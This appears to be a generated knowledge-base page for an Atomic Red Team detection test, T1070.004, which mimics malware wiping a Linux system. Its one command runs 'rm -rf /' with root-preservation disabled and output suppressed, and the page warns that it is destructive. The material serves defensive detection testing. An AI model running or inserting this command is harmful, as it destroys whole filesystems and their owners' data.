---
atomic_guid: "f3aa95fe-4f10-4485-ad26-abf22a764c52"
title: "Delete Filesystem - Linux"
framework: "atomic"
generated: "true"
attack_technique_id: "T1070.004"
attack_technique_name: "Indicator Removal on Host: File Deletion"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.yaml"
build_date: "2026-04-27 19:12:26"
executor: "sh"
aliases:
  - "f3aa95fe-4f10-4485-ad26-abf22a764c52"
  - "Delete Filesystem - Linux"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.

## ATT&CK Mapping

- [[kb/attack/techniques/T1070-indicator_removal#^t1070004-file-deletion|T1070.004: File Deletion]]

## Executor

- name: sh

### Command

```bash
[ "$(uname)" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.004/T1070.004.yaml)
